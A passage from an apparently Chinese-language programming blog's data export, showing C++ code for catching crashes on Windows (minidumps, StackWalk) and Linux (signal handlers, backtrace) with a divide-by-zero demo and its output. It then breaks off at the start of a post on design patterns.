class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">if</span> _WIN64</span></span><br><span class=\"line\">    DWORD machine = IMAGE_FILE_MACHINE_AMD64;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></span><br><span class=\"line\">    DWORD machine = IMAGE_FILE_MACHINE_I386;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">    HANDLE process = <span class=\"built_in\">GetCurrentProcess</span>();</span><br><span class=\"line\">    HANDLE thread  = <span class=\"built_in\">GetCurrentThread</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!::<span class=\"built_in\">SymInitialize</span>(process, <span class=\"literal\">nullptr</span>, TRUE)) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">WRITE_ERROR</span>(<span class=\"string\">&quot;Failed to call SymInitialize&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> std::vector&lt;StackFrame&gt;();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    ::<span class=\"built_in\">SymSetOptions</span>(SYMOPT_LOAD_LINES);</span><br><span class=\"line\">    CONTEXT context = &#123;&#125;;</span><br><span class=\"line\">    context.ContextFlags = CONTEXT_FULL;</span><br><span class=\"line\">    ::<span class=\"built_in\">RtlCaptureContext</span>(&amp;context);</span><br><span class=\"line\"></span><br><span class=\"line\">    STACKFRAME frame &#123;&#125;;</span><br><span class=\"line\">    frame.AddrPC.Mode = AddrModeFlat;</span><br><span class=\"line\">    frame.AddrFrame.Mode = AddrModeFlat;</span><br><span class=\"line\">    frame.AddrStack.Mode = AddrModeFlat;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">if</span> _WIN64</span></span><br><span class=\"line\">    frame.AddrPC.Offset = context.Rip;</span><br><span class=\"line\">    frame.AddrFrame.Offset = context.Rbp;</span><br><span class=\"line\">    frame.AddrStack.Offset = context.Rsp;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></span><br><span class=\"line\">    frame.AddrPC.Offset = context.Eip;</span><br><span class=\"line\">    frame.AddrFrame.Offset = context.Ebp;</span><br><span class=\"line\">    frame.AddrStack.Offset = context.Esp;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">    std::vector&lt;StackFrame&gt; stackframes = <span class=\"built_in\">WalkStacks</span>(machine, process, thread, &amp;frame, &amp;context);</span><br><span class=\"line\">    ::<span class=\"built_in\">SymCleanup</span>(process);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> stackframes;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>执行<code>DumpCollector::Init()</code>并手动触发一次异常，观察异常捕获结果：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* Coredump happend here */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">FuncCoredump</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> a = <span class=\"number\">10</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> b = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> c = a/b;</span><br><span class=\"line\">    std::cout &lt;&lt; c &lt;&lt; std::endl;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Func2</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">FuncCoredump</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Func3</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">Func2</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Func4</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">Func3</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Func5</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">Func4</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">TriggerCrash</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">Func5</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>** argv)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    std::cout &lt;&lt; <span class=\"string\">&quot;Init And Register Crash Handler&quot;</span> &lt;&lt; std::endl;</span><br><span class=\"line\">    DumpCollector::<span class=\"built_in\">Init</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> WIN32</span></span><br><span class=\"line\">    DumpCollector::<span class=\"built_in\">SetDumpFileRoot</span>(<span class=\"string\">&quot;C:\\\\Test\\\\Coredump&quot;</span>);</span><br><span class=\"line\">    DumpCollector::Win32CrashHandler = Win32ApplicationCrashHandler;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">    std::cout &lt;&lt; <span class=\"string\">&quot;Ready To Triger Crash&quot;</span> &lt;&lt; std::endl;</span><br><span class=\"line\">    <span class=\"built_in\">TriggerCrash</span>();</span><br><span class=\"line\">    std::cout &lt;&lt; <span class=\"string\">&quot;All Is Well, No Crash&quot;</span> &lt;&lt; std::endl;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>编译执行，观察输出结果:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\XUranus\\source\\repos\\MiniDump\\build64&gt; .\\Debug\\dumpcollector.exe</span><br><span class=\"line\">Init And Register Crash Handler</span><br><span class=\"line\">Ready To Triger Crash</span><br><span class=\"line\">Dump File Generated At: C:\\Test\\Coredump\\2023-03-21.22.17.28.dmp</span><br><span class=\"line\">Crash Reason: EXCEPTION_INT_DIVIDE_BY_ZERO</span><br><span class=\"line\">C:\\Users\\XUranus\\source\\repos\\MiniDump\\build64\\Debug\\dumpcollector.exe,ApplicationCrashCollector[0x7ff6e4a747cf]C:\\Users\\XUranus\\source\\repos\\MiniDump\\DumpCollector.:90</span><br><span class=\"line\">C:\\WINDOWS\\System32\\KERNELBASE.dll,UnhandledExceptionFilter[0x7ffb0e635f0c]:0</span><br><span class=\"line\">C:\\WINDOWS\\SYSTEM32\\ntdll.dll,RtlMoveMemory[0x7ffb10fd837d]:0</span><br><span class=\"line\">C:\\WINDOWS\\SYSTEM32\\ntdll.dll,_C_specific_handler[0x7ffb10fbefa7]:0</span><br><span class=\"line\">C:\\WINDOWS\\SYSTEM32\\ntdll.dll,_chkstk[0x7ffb10fd3cff]:0</span><br><span class=\"line\">C:\\WINDOWS\\SYSTEM32\\ntdll.dll,RtlFindCharInUnicodeString[0x7ffb10f4e456]:0</span><br><span class=\"line\">C:\\WINDOWS\\SYSTEM32\\ntdll.dll,KiUserExceptionDispatcher[0x7ffb10fd2cee]:0</span><br><span class=\"line\">C:\\Users\\XUranus\\source\\repos\\MiniDump\\build64\\Debug\\dumpcollector.exe,FuncCoredump[0x7ff6e4a7e92b]C:\\Users\\XUranus\\source\\repos\\MiniDump\\Demo.:11</span><br><span class=\"line\">C:\\Users\\XUranus\\source\\repos\\MiniDump\\build64\\Debug\\dumpcollector.exe,Func2[0x7ff6e4a7e96b]C:\\Users\\XUranus\\source\\repos\\MiniDump\\Demo.:18</span><br><span class=\"line\">C:\\Users\\XUranus\\source\\repos\\MiniDump\\build64\\Debug\\dumpcollector.exe,Func3[0x7ff6e4a7e98b]C:\\Users\\XUranus\\source\\repos\\MiniDump\\Demo.:23</span><br><span class=\"line\">C:\\Users\\XUranus\\source\\repos\\MiniDump\\build64\\Debug\\dumpcollector.exe,Func4[0x7ff6e4a7e9ab]C:\\Users\\XUranus\\source\\repos\\MiniDump\\Demo.:28</span><br><span class=\"line\">C:\\Users\\XUranus\\source\\repos\\MiniDump\\build64\\Debug\\dumpcollector.exe,Func5[0x7ff6e4a7e9cb]C:\\Users\\XUranus\\source\\repos\\MiniDump\\Demo.:33</span><br><span class=\"line\">C:\\Users\\XUranus\\source\\repos\\MiniDump\\build64\\Debug\\dumpcollector.exe,TriggerCrash[0x7ff6e4a7e9eb]C:\\Users\\XUranus\\source\\repos\\MiniDump\\Demo.:38</span><br><span class=\"line\">C:\\Users\\XUranus\\source\\repos\\MiniDump\\build64\\Debug\\dumpcollector.exe,main[0x7ff6e4a7ec77]C:\\Users\\XUranus\\source\\repos\\MiniDump\\Demo.:93</span><br><span class=\"line\">C:\\Users\\XUranus\\source\\repos\\MiniDump\\build64\\Debug\\dumpcollector.exe,invoke_main[0x7ff6e4a81929]D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl:79</span><br><span class=\"line\">C:\\Users\\XUranus\\source\\repos\\MiniDump\\build64\\Debug\\dumpcollector.exe,__scrt_common_main_seh[0x7ff6e4a8180e]D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl:288</span><br><span class=\"line\">C:\\Users\\XUranus\\source\\repos\\MiniDump\\build64\\Debug\\dumpcollector.exe,__scrt_common_main[0x7ff6e4a816ce]D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl:331</span><br><span class=\"line\">C:\\Users\\XUranus\\source\\repos\\MiniDump\\build64\\Debug\\dumpcollector.exe,mainCRTStartup[0x7ff6e4a819be]D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcstartup\\src\\startup\\exe_main.cpp:17</span><br><span class=\"line\">C:\\WINDOWS\\System32\\KERNEL32.DLL,BaseThreadInitThunk[0x7ffb0f1e26bd]:0</span><br><span class=\"line\">C:\\WINDOWS\\SYSTEM32\\ntdll.dll,RtlUserThreadStart[0x7ffb10f8a9f8]:0</span><br></pre></td></tr></table></figure>\n<p>可以看到异常原因为<code>EXCEPTION_INT_DIVIDE_BY_ZERO</code>，捕获到堆栈：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Users\\XUranus\\source\\repos\\MiniDump\\build64\\Debug\\dumpcollector.exe,FuncCoredump[0x7ff6e4a7e92b]C:\\Users\\XUranus\\source\\repos\\MiniDump\\Demo.:11</span><br><span class=\"line\">C:\\Users\\XUranus\\source\\repos\\MiniDump\\build64\\Debug\\dumpcollector.exe,Func2[0x7ff6e4a7e96b]C:\\Users\\XUranus\\source\\repos\\MiniDump\\Demo.:18</span><br><span class=\"line\">C:\\Users\\XUranus\\source\\repos\\MiniDump\\build64\\Debug\\dumpcollector.exe,Func3[0x7ff6e4a7e98b]C:\\Users\\XUranus\\source\\repos\\MiniDump\\Demo.:23</span><br><span class=\"line\">C:\\Users\\XUranus\\source\\repos\\MiniDump\\build64\\Debug\\dumpcollector.exe,Func4[0x7ff6e4a7e9ab]C:\\Users\\XUranus\\source\\repos\\MiniDump\\Demo.:28</span><br><span class=\"line\">C:\\Users\\XUranus\\source\\repos\\MiniDump\\build64\\Debug\\dumpcollector.exe,Func5[0x7ff6e4a7e9cb]C:\\Users\\XUranus\\source\\repos\\MiniDump\\Demo.:33</span><br><span class=\"line\">C:\\Users\\XUranus\\source\\repos\\MiniDump\\build64\\Debug\\dumpcollector.exe,TriggerCrash[0x7ff6e4a7e9eb]C:\\Users\\XUranus\\source\\repos\\MiniDump\\Demo.:38</span><br><span class=\"line\">C:\\Users\\XUranus\\source\\repos\\MiniDump\\build64\\Debug\\dumpcollector.exe,main[0x7ff6e4a7ec77]C:\\Users\\XUranus\\source\\repos\\MiniDump\\Demo.:93</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>注意：生成堆栈必须要在编译的时候保留符号表（<code>*.pdb</code>）文件，如果缺少符号表将不能获得函数名、文件名和行号等信息。如果开启了llvm编译后端优化，编译后的堆栈和符号表中的堆栈可能不一致，会导致收集到的堆栈信息和实际堆栈不一致，要获取实际堆栈信息还得用VS处理生成的MiniDump文件。上述程序中生成MiniDump文件需要对应体系结构(x86/x64)的<code>imagehlp.lib</code>库，如果<code>system32</code>中不包含<code>imagehlp.dll</code>则需要手动指定。</p>\n</blockquote>\n<h2 id=\"Linux捕获Crash\"><a href=\"#Linux捕获Crash\" class=\"headerlink\" title=\"Linux捕获Crash\"></a>Linux捕获Crash</h2><p>Linux通过信号机制抛出异常，Linux下可以通过捕获信号来捕获异常：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">DumpCollector::Init</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> WIN32</span></span><br><span class=\"line\">    <span class=\"comment\">// ::SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)ApplicationCrashCollector);</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></span><br><span class=\"line\">    DumpCollector::<span class=\"built_in\">SetPosixSignalHandler</span>();</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">PosixApplicationSignalCollector</span><span class=\"params\">(<span class=\"keyword\">int</span> sig, <span class=\"keyword\">siginfo_t</span>* siginfo, <span class=\"keyword\">void</span>* context)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\">std::lock_guard&lt;std::mutex&gt; <span class=\"title\">lck</span><span class=\"params\">(DumpCollector::lock)</span></span>;</span><br><span class=\"line\">    DumpCollector::sig = sig;</span><br><span class=\"line\">    DumpCollector::siginfo = siginfo;</span><br><span class=\"line\"></span><br><span class=\"line\">    std::string exceptionCause = DumpCollector::<span class=\"built_in\">GetPosixExceptionInfo</span>();</span><br><span class=\"line\">    std::vector&lt;StackFrame&gt; stacktrace = DumpCollector::<span class=\"built_in\">DumpPosixStackTrace</span>();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (DumpCollector::PosixCrashHandler == <span class=\"literal\">nullptr</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">WRITE_ERROR</span>(<span class=\"string\">&quot;missing posix crash handler&quot;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        DumpCollector::<span class=\"built_in\">PosixCrashHandler</span>(exceptionCause, stacktrace);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    std::<span class=\"built_in\">abort</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">DumpCollector::SetPosixSignalHandler</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"keyword\">uint8_t</span> alternateStack[SIGSTKSZ];</span><br><span class=\"line\">    <span class=\"comment\">// setup alternate stack</span></span><br><span class=\"line\">    <span class=\"keyword\">stack_t</span> ss &#123;&#125;;</span><br><span class=\"line\">    <span class=\"comment\">// malloc is usually used here, I&#x27;m not 100% sure my static allocation is valid but it seems to work just fine. */</span></span><br><span class=\"line\">    ss.ss_sp = (<span class=\"keyword\">void</span>*)alternateStack;</span><br><span class=\"line\">    ss.ss_size = SIGSTKSZ;</span><br><span class=\"line\">    ss.ss_flags = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (::<span class=\"built_in\">sigaltstack</span>(&amp;ss, <span class=\"literal\">NULL</span>) != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">WRITE_ERROR</span>(<span class=\"string\">&quot;call sigaltstack() error&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// register posix signal handlers</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sigaction</span> <span class=\"title\">signalAction</span> &#123;</span>&#125;;</span><br><span class=\"line\">    signalAction.sa_sigaction = PosixApplicationSignalCollector;</span><br><span class=\"line\">    ::<span class=\"built_in\">sigemptyset</span>(&amp;signalAction.sa_mask);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> __APPLE__</span></span><br><span class=\"line\">    <span class=\"comment\">// for some reason we backtrace() doesn&#x27;t work on osx when we use an alternate stack</span></span><br><span class=\"line\">    signalAction.sa_flags = SA_SIGINFO;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></span><br><span class=\"line\">    signalAction.sa_flags = SA_SIGINFO | SA_ONSTACK;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">sigaction</span>(SIGSEGV, &amp;signalAction, <span class=\"literal\">nullptr</span>) != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">WRITE_ERROR</span>(<span class=\"string\">&quot;call sigaction(SIGSEGV) error&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">sigaction</span>(SIGFPE, &amp;signalAction, <span class=\"literal\">nullptr</span>) != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">WRITE_ERROR</span>(<span class=\"string\">&quot;call sigaction(SIGFPE) error&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">sigaction</span>(SIGINT, &amp;signalAction, <span class=\"literal\">nullptr</span>) != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">WRITE_ERROR</span>(<span class=\"string\">&quot;call sigaction(SIGINT) error&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">sigaction</span>(SIGILL, &amp;signalAction, <span class=\"literal\">nullptr</span>) != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">WRITE_ERROR</span>(<span class=\"string\">&quot;call sigaction(SIGILL) error&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">sigaction</span>(SIGTERM, &amp;signalAction, <span class=\"literal\">nullptr</span>) != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">WRITE_ERROR</span>(<span class=\"string\">&quot;call sigaction(SIGTERM) error&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// skip SIGABRT in case of infinite loop</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从信号推测可能的异常原因：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">std::string <span class=\"title\">DumpCollector::GetPosixExceptionInfo</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> sig = DumpCollector::sig;</span><br><span class=\"line\">    <span class=\"keyword\">siginfo_t</span> *siginfo = <span class=\"keyword\">static_cast</span>&lt;<span class=\"keyword\">siginfo_t</span>*&gt;(DumpCollector::siginfo);</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">switch</span></span> (sig)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> SIGSEGV: <span class=\"keyword\">return</span> <span class=\"string\">&quot;Caught SIGSEGV: Segmentation Fault&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> SIGINT: <span class=\"keyword\">return</span> <span class=\"string\">&quot;Caught SIGINT: Interactive attention signal, (usually ctrl+c)&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> SIGFPE: &#123;</span><br><span class=\"line\">            <span class=\"built_in\"><span class=\"keyword\">switch</span></span> (siginfo-&gt;si_code) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> FPE_INTDIV: <span class=\"keyword\">return</span> <span class=\"string\">&quot;Caught SIGFPE: (integer divide by zero)&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> FPE_INTOVF: <span class=\"keyword\">return</span> <span class=\"string\">&quot;Caught SIGFPE: (integer overflow)&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> FPE_FLTDIV: <span class=\"keyword\">return</span> <span class=\"string\">&quot;Caught SIGFPE: (floating-point divide by zero)&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> FPE_FLTOVF: <span class=\"keyword\">return</span> <span class=\"string\">&quot;Caught SIGFPE: (floating-point overflow)&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> FPE_FLTUND: <span class=\"keyword\">return</span> <span class=\"string\">&quot;Caught SIGFPE: (floating-point underflow)&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> FPE_FLTRES: <span class=\"keyword\">return</span> <span class=\"string\">&quot;Caught SIGFPE: (floating-point inexact result)&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> FPE_FLTINV: <span class=\"keyword\">return</span> <span class=\"string\">&quot;Caught SIGFPE: (floating-point invalid operation)&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> FPE_FLTSUB: <span class=\"keyword\">return</span> <span class=\"string\">&quot;Caught SIGFPE: (subscript out of range)&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">default</span>: <span class=\"keyword\">return</span> <span class=\"string\">&quot;Caught SIGFPE: Arithmetic Exception&quot;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> SIGILL: &#123;</span><br><span class=\"line\">            <span class=\"built_in\"><span class=\"keyword\">switch</span></span> (siginfo-&gt;si_code) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> ILL_ILLOPC: <span class=\"keyword\">return</span> <span class=\"string\">&quot;Caught SIGILL: (illegal opcode)&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> ILL_ILLOPN: <span class=\"keyword\">return</span> <span class=\"string\">&quot;Caught SIGILL: (illegal operand)&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> ILL_ILLADR: <span class=\"keyword\">return</span> <span class=\"string\">&quot;Caught SIGILL: (illegal addressing mode)&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> ILL_ILLTRP: <span class=\"keyword\">return</span> <span class=\"string\">&quot;Caught SIGILL: (illegal trap)&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> ILL_PRVOPC: <span class=\"keyword\">return</span> <span class=\"string\">&quot;Caught SIGILL: (privileged opcode)&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> ILL_PRVREG: <span class=\"keyword\">return</span> <span class=\"string\">&quot;Caught SIGILL: (privileged register)&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> ILL_COPROC: <span class=\"keyword\">return</span> <span class=\"string\">&quot;Caught SIGILL: (coprocessor error)&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> ILL_BADSTK: <span class=\"keyword\">return</span> <span class=\"string\">&quot;Caught SIGILL: (internal stack error)&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">default</span>: <span class=\"keyword\">return</span> <span class=\"string\">&quot;Caught SIGILL: Illegal Instruction&quot;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> SIGTERM: <span class=\"keyword\">return</span> <span class=\"string\">&quot;Caught SIGTERM: a termination request was sent to the program&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> SIGABRT: <span class=\"keyword\">return</span> <span class=\"string\">&quot;Caught SIGABRT: usually caused by an abort() or assert()&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>: <span class=\"keyword\">return</span> <span class=\"string\">&quot;Unknown&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;Unknown&quot;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>获取堆栈信息：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">std::vector&lt;StackFrame&gt; <span class=\"title\">DumpCollector::DumpPosixStackTrace</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    std::vector&lt;StackFrame&gt; stacktrace;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"keyword\">void</span>* stacktraces[POSIX_MAX_STACK_FRAMES];</span><br><span class=\"line\">    <span class=\"keyword\">int</span> traceSize = ::<span class=\"built_in\">backtrace</span>(stacktraces, POSIX_MAX_STACK_FRAMES);</span><br><span class=\"line\">    <span class=\"keyword\">char</span>** messages = ::<span class=\"built_in\">backtrace_symbols</span>(stacktraces, traceSize);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; traceSize; ++i) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//if (::addr2line(icky_global_program_name, stacktraces[i]) != 0) &#123;</span></span><br><span class=\"line\">        <span class=\"comment\">//    ::printf(&quot;  error determining line # for: %s\\n&quot;, messages[i]);</span></span><br><span class=\"line\">        <span class=\"comment\">//&#125;</span></span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[%d]%s\\n&quot;</span>, i, messages[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (messages) &#123;</span><br><span class=\"line\">        ::<span class=\"built_in\">free</span>(messages);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> stacktrace;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://blog.csdn.net/rqf520/article/details/102698796\">windows appcrash 注册表配置 dump生成</a></li>\n</ul>\n","tags":["Coredump"]},{"title":"设计模式","url":"/2018/11/05/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><h2 id=\"什么是模式\"><a href=\"#什么是模式\" class=\"headerlink\" title=\"什么是模式\"></a>什么是模式</h2><p>在一个环境中对一个问题的解决方案就是模式</p>\n<h2 id=\"为什么需要模式\"><a href=\"#为什么需要模式\" class=\"headerlink\" title=\"为什么需要模式\"></a>为什么需要模式</h2><p>有经验的程序员会复用过去问题中的解决方案。结构优良的面向对象系统有类和对象的迭代模式。对过去模式的知识的学习让一个开发者效率更高而且让设计变得更活且可复用。</p>\n<p>Benefits Of Design Patterns<br>Capture expertise and make it accessible to<br>non-experts in a standard form<br>n Facilitate communication among developers<br>by providing a common language<br>n Make it easier to reuse successful designs<br>and avoid alternatives that diminish<br>reusability<br>n Facilitate design modifications<br>n Improve design documentation<br>Improve design understandability</p>\n<span id=\"more\"></span>\n<h2 id=\"为什么需要学习设计模式\"><a href=\"#为什么需要学习设计模式\" class=\"headerlink\" title=\"为什么需要学习设计模式\"></a>为什么需要学习设计模式</h2><ul>\n<li>可以复用设计的专业知识</li>\n<li>让软件更加灵活可变，可拓展</li>\n<li>统一两个工程师之间的交流术语</li>\n</ul>\n<h2 id=\"设计模式的弊端\"><a href=\"#设计模式的弊端\" class=\"headerlink\" 